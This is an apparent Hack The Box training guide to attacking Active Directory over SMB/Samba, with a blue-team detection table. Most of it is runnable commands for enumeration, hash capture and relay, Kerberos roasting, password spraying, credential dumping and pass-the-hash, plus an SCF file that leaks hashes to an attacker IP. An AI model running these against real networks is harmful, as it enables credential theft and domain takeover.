# HTB Active Directory Labs — The Samba / SMB Attack Vector

> A methodology-first field guide for attacking **Active Directory** on **Hack The Box**
> through the **SMB (Server Message Block)** surface — the protocol that Samba
> implements on Linux and that Windows Domain Controllers expose on ports **139/445**.

> [!IMPORTANT]
> **Authorized use only.** Everything below is written for **Hack The Box**,
> other CTF platforms, and lab environments **you own or are explicitly permitted
> to test**. SMB enumeration, credential attacks, and relaying against systems you
> do not have written authorization to assess is illegal. Stay in scope.

---

## Table of Contents

1. [Why SMB/Samba is the front door to AD](#1-why-smbsamba-is-the-front-door-to-ad)
2. [Toolbox & setup](#2-toolbox--setup)
3. [The methodology at a glance](#3-the-methodology-at-a-glance)
4. [Phase 1 — Discovery & service enumeration](#4-phase-1--discovery--service-enumeration)
5. [Phase 2 — Unauthenticated SMB enumeration](#5-phase-2--unauthenticated-smb-enumeration)
6. [Phase 3 — Share hunting & loot](#6-phase-3--share-hunting--loot)
7. [Phase 4 — From SMB to credentials](#7-phase-4--from-smb-to-credentials)
8. [Phase 5 — Authenticated enumeration](#8-phase-5--authenticated-enumeration)
9. [Phase 6 — Lateral movement & privilege escalation](#9-phase-6--lateral-movement--privilege-escalation)
10. [Samba-specific CVEs you will meet on HTB](#10-samba-specific-cves-you-will-meet-on-htb)
11. [Mapping the vector to real HTB machines](#11-mapping-the-vector-to-real-htb-machines)
12. [Blue-team notes — how each step is detected & prevented](#12-blue-team-notes)
13. [Quick command cheat sheet](#13-quick-command-cheat-sheet)
14. [References](#14-references)

---

## 1. Why SMB/Samba is the front door to AD

Active Directory is glued together by a handful of protocols. SMB is the one you
almost always touch first because it is:

- **Always exposed on a DC** — `445/tcp` (direct-hosted SMB) and legacy
  `139/tcp` (NetBIOS session). SYSVOL and NETLOGON shares live here and are
  readable by every authenticated user by design.
- **A leaky enumeration surface** — depending on hardening you can pull the
  domain name, users, groups, password policy, and shares *before you have a
  single credential*.
- **A credential-material goldmine** — SYSVOL holds Group Policy Preferences,
  logon scripts, and config files that routinely contain passwords in HTB labs
  (the classic being the `Active` box's `Groups.xml`).
- **An execution & movement channel** — once you hold a credential or NTLM hash,
  SMB gives you `psexec` / `smbexec` / `wmiexec`, pass-the-hash, and DCSync.

**Samba** is the open-source Unix implementation of the SMB/CIFS protocol. Two
things matter for HTB:

1. On **Linux HTB targets**, the SMB service you enumerate *is* Samba (`smbd`),
   and it brings its own history of exploitable bugs (see §10).
2. On your **Kali/attacker box**, the `smbclient`, `rpcclient`, and `net`
   binaries you use are shipped by the Samba suite — so "the Samba vector" cuts
   both ways: it is both the target service and part of your tooling.

---

## 2. Toolbox & setup

Install the workhorses (all present on an up-to-date Kali/Parrot; versions given
are "modern equivalents"):

| Tool | Purpose |
|------|---------|
| **nmap** | Port/service/script discovery |
| **NetExec** (`nxc`, the maintained successor to CrackMapExec) | Swiss-army SMB/LDAP/WinRM enumeration & spraying |
| **enum4linux-ng** | Automated null-session enumeration (users, groups, shares, policy) |
| **smbclient / smbmap** | Interactive share access & permission mapping |
| **rpcclient** | MS-RPC queries over SMB (user/group/RID enumeration) |
| **Impacket suite** | `GetNPUsers`, `GetUserSPNs`, `secretsdump`, `psexec`, `wmiexec`, `smbexec`, `ntlmrelayx` |
| **BloodHound** + `bloodhound-python` / `nxc --bloodhound` | Graph the domain, find attack paths |
| **kerbrute** | Fast Kerberos user enumeration & password spraying |
| **Responder** | LLMNR/NBT-NS/mDNS poisoning to capture NetNTLM hashes |
| **hashcat / john** | Crack captured hashes (NetNTLMv2, Kerberos, GPP, etc.) |

Set variables once so the commands below stay copy-paste friendly:

```bash
export IP=10.10.10.100          # target DC
export DOMAIN=htb.local         # AD domain (FQDN)
export DC=dc01.htb.local        # DC hostname
export USER=''                  # fill in as you obtain creds
export PASS=''
# Keep name resolution sane for Kerberos:
echo "$IP  $DC $DOMAIN" | sudo tee -a /etc/hosts
```

> [!TIP]
> Kerberos is time-sensitive. If Kerberos auth fails with clock-skew errors,
> sync to the DC: `sudo ntpdate $IP` (or `sudo rdate -n $IP`).

---

## 3. The methodology at a glance

```
 ┌───────────────┐   ┌──────────────────────┐   ┌───────────────────┐
 │ 1. Discovery  │──▶│ 2. Unauth SMB enum   │──▶│ 3. Share hunting  │
 │  nmap 139/445 │   │  null session, RID   │   │  SYSVOL, GPP, loot│
 └───────────────┘   └──────────────────────┘   └─────────┬─────────┘
                                                           │
 ┌───────────────────────┐   ┌──────────────────────┐     ▼
 │ 6. Lateral / privesc  │◀──│ 5. Authed enum       │◀── 4. Get a credential
 │  PtH, psexec, DCSync  │   │  BloodHound, secrets │    (roast/spray/relay)
 └───────────────────────┘   └──────────────────────┘
```

The loop is: **enumerate → find a credential → re-enumerate with more privilege →
find a path to Domain Admin.** SMB participates in every box of that diagram.

---

## 4. Phase 1 — Discovery & service enumeration

Fingerprint the SMB stack and the surrounding AD services:

```bash
# Fast top-ports sweep first, then targeted deep scan on what's open
nmap -Pn -p- --min-rate 2000 -oA nmap/allports $IP

# AD service fingerprint + SMB safe scripts
nmap -Pn -sC -sV -p 88,135,139,389,445,464,593,636,3268,3269,5985 \
     --script "smb-os-discovery,smb-security-mode,smb2-security-mode,smb-protocols" \
     -oA nmap/ad $IP
```

What to read from the output:

- **`smb-os-discovery`** → OS build, computer name, **domain/forest FQDN**, and DNS
  name. This seeds `$DOMAIN` and `$DC`.
- **`smb-security-mode` / `smb2-security-mode`** → is **SMB signing** required?
  If signing is **not required**, SMB **relay** (§7) is on the table.
- **`smb-protocols`** → is legacy **SMBv1** enabled? That flags old, possibly
  vulnerable Samba/Windows (relevant to §10 CVEs).
- Ports **88/389/636/3268** confirm you are looking at a **Domain Controller**.

Cross-check signing status quickly with NetExec (it prints `signing:True/False`):

```bash
nxc smb $IP
```

---

## 5. Phase 2 — Unauthenticated SMB enumeration

Before any credentials, test what the anonymous / null / guest sessions reveal.

### 5.1 Null & guest sessions

```bash
# Anonymous ("null") session — no username, no password
nxc smb $IP -u '' -p '' --shares
# Guest account (often left enabled)
nxc smb $IP -u 'guest' -p '' --shares
```

### 5.2 One-shot automated enumeration

```bash
enum4linux-ng -A $IP | tee enum4linux.txt
```

`enum4linux-ng` will attempt: OS info, users, groups, shares, password policy,
and RID cycling — all over the null session where the DC permits it.

### 5.3 RPC & RID cycling (pulling users with no creds)

When direct user enumeration is blocked but RID cycling is allowed, you can walk
the domain's RID range to recover account names:

```bash
# Interactive RPC
rpcclient -U "" -N $IP
  > srvinfo
  > enumdomusers
  > enumdomgroups
  > querydominfo
  > getdompwinfo          # password policy → tells you spray thresholds
  > queryuser 0x1f4       # look up a specific RID

# Automated RID brute force with NetExec
nxc smb $IP -u 'guest' -p '' --rid-brute 4000
```

### 5.4 Turn names into a userlist

Every recovered account name goes into `users.txt`. That file feeds AS-REP
roasting, password spraying, and Kerbrute in §7:

```bash
# Example: extract just the SAM names from a NetExec rid-brute run
nxc smb $IP -u 'guest' -p '' --rid-brute 4000 \
  | grep 'SidTypeUser' | awk -F'\\' '{print $2}' | awk '{print $1}' > users.txt
```

> [!NOTE]
> Modern, hardened DCs restrict anonymous access (`RestrictAnonymous`), so null
> sessions may return little. On HTB, many AD boxes intentionally leave a foothold
> here — but if it's locked down, pivot to Kerberos user enumeration with
> `kerbrute userenum` (§7.1), which needs no SMB session at all.

---

## 6. Phase 3 — Share hunting & loot

Shares are where SMB pays off. Map permissions first, then read everything you can.

```bash
# Permission map across all shares (READ/WRITE flags)
smbmap -H $IP -u guest -p ''
nxc smb $IP -u "$USER" -p "$PASS" --shares

# Recursively list a share's contents
smbmap -H $IP -u "$USER" -p "$PASS" -R 'Department Shares'

# Interactive access
smbclient //$IP/SYSVOL -U "$USER%$PASS"
smbclient //$IP/'Replication' -N          # anonymous
```

### 6.1 The classic: Group Policy Preferences (GPP) passwords

The single most iconic HTB SMB find. SYSVOL (or a `Replication` share mirroring
it) contains `Groups.xml` with an **AES-encrypted** `cpassword` — and Microsoft
**published the AES key**, so it is trivially decryptable:

```bash
# Find it
smbclient //$IP/Replication -N -c 'recurse ON; ls'
# ...navigate to: active.htb/Policies/{GUID}/MACHINE/Preferences/Groups/Groups.xml

# Decrypt the cpassword
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
# → GPPstillStandingStrong2k18   (example from HTB "Active")
```

NetExec automates the whole hunt:

```bash
nxc smb $IP -u "$USER" -p "$PASS" -M gpp_password
nxc smb $IP -u "$USER" -p "$PASS" -M gpp_autologin
```

### 6.2 Spider every share for secrets

```bash
# NetExec spider module — grep filenames and content for creds
nxc smb $IP -u "$USER" -p "$PASS" -M spider_plus
# Output lands in ~/.nxc/modules/nxc_spider_plus/<ip>.json
```

Loot to prioritize: `*.xml`, `*.ini`, `*.config`, `web.config`, `unattend.xml`,
`sysprep.xml`, `*.kdbx` (KeePass), `*.ps1` logon scripts, `.ssh/`, and anything
named `pass`, `cred`, `backup`, or `secret`.

### 6.3 Writable share → coerced authentication (SCF / LNK / URL)

If you have **write** to a share that users browse, drop a file that forces the
victim's Explorer to authenticate to **your** host (over SMB), so Responder/`ntlmrelayx`
can capture or relay the hash (§7.3):

```ini
; @evil.scf  — dropped into a writable, browsed share
[Shell]
Command=2
IconFile=\\10.10.14.7\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

The moment a user opens the folder, Explorer tries to fetch `IconFile` from your
IP and leaks a NetNTLM hash. (This is the `Forest`/`Cascade`-style coercion when
combined with Responder — used in `PoisoningWithSCF` / `nxc -M slinky`.)

---

## 7. Phase 4 — From SMB to credentials

You have names (and maybe one weak credential). Turn that into usable AD creds.

### 7.1 Kerberos user validation & AS-REP roasting

```bash
# Validate which names actually exist (no SMB session needed)
kerbrute userenum -d $DOMAIN --dc $DC users.txt

# AS-REP roast: users with "Do not require Kerberos preauth" leak a crackable hash
impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $IP -format hashcat
nxc ldap $IP -u users.txt -p '' --asreproast asrep.txt

hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### 7.2 Kerberoasting (needs any valid domain credential)

```bash
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request -outputfile kerb.txt
nxc ldap $IP -u "$USER" -p "$PASS" --kerberoasting kerb.txt

hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```

### 7.3 Password spraying over SMB

Spray a single, policy-safe password across all users. **Respect the lockout
threshold** you read from `getdompwinfo` — spray one password domain-wide, then
wait, never many passwords against one account.

```bash
nxc smb $IP -u users.txt -p 'Welcome2024!' --continue-on-success
# Reuse a found password across the domain to find shared creds:
nxc smb $IP -u users.txt -p 'GPPstillStandingStrong2k18' --continue-on-success
```

### 7.4 LLMNR/NBT-NS poisoning & SMB relay

If SMB **signing is not required** (checked in §4) you can relay captured
authentications straight into code execution or hash dumps — no cracking needed.

```bash
# Capture NetNTLMv2 by poisoning name resolution
sudo responder -I tun0 -wv
# hashes land in /usr/share/responder/logs/  → crack with hashcat -m 5600

# Relay instead of crack: turn off Responder's SMB/HTTP servers first,
# then relay to a signing-disabled host and dump SAM (or exec a command)
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
impacket-ntlmrelayx -t smb://$IP  -smb2support -c 'whoami /all'
```

---

## 8. Phase 5 — Authenticated enumeration

With a working credential (or NTLM hash), re-enumerate — you can see far more now.

```bash
# Confirm the credential and check for local admin ("Pwn3d!")
nxc smb $IP -u "$USER" -p "$PASS"
# Pass-the-hash form:
nxc smb $IP -u "$USER" -H "$NTHASH"

# Enumerate logged-on users, sessions, password policy, LSA/SAM if admin
nxc smb $IP -u "$USER" -p "$PASS" --users --groups --pass-pol --loggedon-users
nxc smb $IP -u "$USER" -p "$PASS" --sam --lsa          # needs local admin
```

### 8.1 BloodHound — map the whole domain

```bash
# Remote collection over LDAP/SMB (no agent on target)
bloodhound-python -u "$USER" -p "$PASS" -d $DOMAIN -ns $IP -c All --zip
# Or via NetExec's built-in collector:
nxc ldap $IP -u "$USER" -p "$PASS" --bloodhound --collection All --dns-server $IP
```

Import the ZIP into BloodHound and run the pre-built queries:
*Shortest Path to Domain Admins*, *Kerberoastable users*, *AS-REP roastable
users*, *Users with DCSync rights (GetChanges/GetChangesAll)*, *ACL abuse
(GenericAll / WriteDACL / ForceChangePassword)*.

### 8.2 Dump secrets when you have privilege

```bash
# Remote SAM/LSA/NTDS extraction (needs admin, or DCSync rights for -just-dc)
impacket-secretsdump $DOMAIN/$USER:$PASS@$IP
impacket-secretsdump $DOMAIN/$USER@$IP -hashes :$NTHASH -just-dc-user Administrator
```

---

## 9. Phase 6 — Lateral movement & privilege escalation

SMB is the movement channel. All of these accept `-hashes LM:NT` for
**pass-the-hash** if you only have a hash:

```bash
# Interactive shells over SMB (SYSTEM via service creation / task exec)
impacket-psexec  $DOMAIN/$USER:$PASS@$IP
impacket-smbexec $DOMAIN/$USER@$IP -hashes :$NTHASH
impacket-wmiexec $DOMAIN/$USER:$PASS@$IP      # quieter, no service artifact

# Command exec + PtH via NetExec across many hosts at once
nxc smb targets.txt -u "$USER" -H "$NTHASH" -x 'whoami' --exec-method smbexec
```

### 9.1 DCSync → Domain Admin

If your principal holds replication rights (`GetChanges` + `GetChangesAll` — often
reachable via an ACL abuse path in BloodHound), pull the KRBTGT and Administrator
hashes and you own the domain:

```bash
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc
# → grab krbtgt hash for a Golden Ticket, and Administrator NT hash for PtH
```

### 9.2 Pass-the-hash to full compromise

```bash
# Log in as Administrator using only the NT hash recovered above
impacket-psexec Administrator@$IP -hashes :$ADMIN_NTHASH
nxc smb $IP -u Administrator -H $ADMIN_NTHASH -x 'type C:\Users\Administrator\Desktop\root.txt'
```

---

## 10. Samba-specific CVEs you will meet on HTB

When the SMB service is *actual Samba on Linux*, the version banner
(`smb-os-discovery` / `smbclient`) can point straight at a public RCE:

| CVE | Name | Affected | HTB relevance |
|-----|------|----------|----------------|
| **CVE-2007-2447** | `usermap_script` command injection | Samba 3.0.0–3.0.25rc3 | The **`Lame`** box — inject an OS command through the username field on the `smbd` "username map script" path for an instant root shell. |
| **CVE-2017-7494** | **SambaCry** (`is_known_pipename`) | Samba 3.5.0–4.6.x | Upload a shared library to a writable share, then load it via a named pipe to get RCE as the `smbd` user. |
| **CVE-2010-0926** | Writable share via symlink/`wide links` | misconfigured `smb.conf` | Read outside the share root — file disclosure primitive. |
| **CVE-2021-44142** | `vfs_fruit` OOB heap write | Samba < 4.13.17 | Heap RCE where the macOS-compat VFS module is enabled. |

`usermap_script` (CVE-2007-2447) is the textbook one — the payload is nothing more
than putting `` /=`nohup <cmd>` `` in the username field:

```bash
# Confirm version first
smbclient -L //$IP -N
nmap -p139,445 --script smb-vuln-cve2007-2447 $IP

# Metasploit path (usermap_script) or manual smbclient username-field injection.
# In Metasploit: use exploit/multi/samba/usermap_script → set RHOSTS → run
```

> [!TIP]
> Always match the exact Samba version to the CVE before firing an exploit — on
> HTB a wrong version wastes a lot of time and can crash the service.

---

## 11. Mapping the vector to real HTB machines

The SMB/Samba vector shows up on a large fraction of HTB's AD and Linux boxes.
A learning path (no full spoilers — just where the vector lands):

| Machine | Difficulty | SMB/Samba role in the chain |
|---------|-----------|------------------------------|
| **Lame** | Easy (Linux) | Direct Samba RCE — CVE-2007-2447 `usermap_script` → root. The purest "Samba vector" box. |
| **Active** | Easy (AD) | Anonymous `Replication` share → SYSVOL `Groups.xml` → `gpp-decrypt` → Kerberoast the service account → DA. |
| **Forest** | Easy (AD) | RID/LDAP user enum → **AS-REP roast** → BloodHound ACL path (`WriteDacl`) → DCSync. |
| **Sauna** | Easy (AD) | User list from the website → AS-REP roast → autologon creds → DCSync via BloodHound. |
| **Return** | Easy (AD) | SMB/LDAP enum → printer creds → `Server Operators` → SYSTEM. |
| **Cascade** | Medium (AD) | SMB share enum → config/DB creds → SMB share secrets → deleted-object recovery → DA. |
| **Blackfield** | Hard (AD) | Anonymous SMB share → RID brute → AS-REP roast → SeBackupPrivilege → NTDS dump. |
| **Monteverde** | Medium (AD) | SMB user enum → password reuse → Azure AD Connect creds → DA. |

**Recommended progression:** `Lame` (Samba RCE) → `Active` (GPP over SMB) →
`Forest`/`Sauna` (roasting + BloodHound) → `Blackfield`/`Cascade` (full chain).

---

## 12. Blue-team notes

Understanding the defense makes you a better operator and closes the loop for
anyone using this repo on the defensive side.

| Attack step | Detection | Prevention / hardening |
|-------------|-----------|------------------------|
| Null-session enum, RID cycling | Spikes of anonymous `\srvsvc`/`\samr` RPC binds; Event ID 4625/anon logons | Set `RestrictAnonymous`/`RestrictAnonymousSAM`; disable the Guest account. |
| GPP `cpassword` in SYSVOL | File reads of `Groups.xml`; presence of `cpassword` in SYSVOL | Delete legacy GPP with `cpassword`; apply **KB2962486**; never store passwords in GPP. |
| AS-REP roasting | Event **4768** with pre-auth not required | Remove *"Do not require Kerberos preauth"*; long, random passwords on such accounts. |
| Kerberoasting | Event **4769** with `RC4` (`0x17`) encryption for many SPNs | 25+ char **gMSA/managed** service passwords; AES-only; monitor 4769 volume. |
| Password spraying | Many 4625/4771 across accounts from one source | Lockout policy, smart lockout, MFA, and spray-detection alerting. |
| LLMNR/NBT-NS poisoning & SMB relay | Rogue responders; unusual inbound SMB auth | **Disable LLMNR & NBT-NS**; **require SMB signing**; enable EPA/channel binding. |
| Pass-the-hash / DCSync | Event **4662** replication access by non-DC; anomalous `psexec` service creation | Tier-0 isolation; **Protected Users** group; LAPS; restrict replication rights; alert on 4662. |
| Samba CVE RCE (Linux) | IDS signatures on the exploit path; unexpected `smbd` child processes | Patch Samba; disable SMBv1; drop `usermap script`; run `smbd` least-privileged/sandboxed. |

---

## 13. Quick command cheat sheet

```bash
# --- Discover ---
nmap -Pn -p139,445,88,389,636,3268,5985 -sV --script smb-os-discovery $IP
nxc smb $IP                                   # OS, domain, signing status

# --- Unauth enum ---
nxc smb $IP -u '' -p '' --shares
enum4linux-ng -A $IP
rpcclient -U "" -N $IP -c 'enumdomusers;getdompwinfo'
nxc smb $IP -u guest -p '' --rid-brute 4000

# --- Shares & loot ---
smbmap -H $IP -u "$USER" -p "$PASS"
smbclient //$IP/SYSVOL -U "$USER%$PASS"
nxc smb $IP -u "$USER" -p "$PASS" -M gpp_password -M spider_plus
gpp-decrypt '<cpassword>'

# --- Get creds ---
kerbrute userenum -d $DOMAIN --dc $DC users.txt
impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $IP -format hashcat
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request
nxc smb $IP -u users.txt -p 'Season2024!' --continue-on-success
sudo responder -I tun0 -wv

# --- Authed enum ---
nxc smb $IP -u "$USER" -p "$PASS" --users --groups --pass-pol
bloodhound-python -u "$USER" -p "$PASS" -d $DOMAIN -ns $IP -c All --zip

# --- Move & escalate ---
impacket-secretsdump $DOMAIN/$USER:$PASS@$IP
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc      # DCSync
impacket-psexec  $DOMAIN/$USER@$IP -hashes :$NTHASH        # pass-the-hash
impacket-wmiexec $DOMAIN/$USER:$PASS@$IP
```

---

## 14. References

- Hack The Box Academy — *Active Directory Enumeration & Attacks*, *Password Attacks*
- Impacket — https://github.com/fortra/impacket
- NetExec (maintained CrackMapExec successor) — https://github.com/Pennyw0rth/NetExec
- enum4linux-ng — https://github.com/cddmp/enum4linux-ng
- Responder — https://github.com/lgandx/Responder
- BloodHound — https://bloodhound.readthedocs.io
- Samba security advisories — https://www.samba.org/samba/security/
- MITRE ATT&CK — T1187 (Forced Auth), T1558 (Kerberos), T1550 (Alt. Auth Material), T1003 (Credential Dumping)

---

> [!IMPORTANT]
> This guide is educational material for authorized lab environments (Hack The Box
> and similar). Do not run any of it against systems you are not explicitly
> permitted to test.
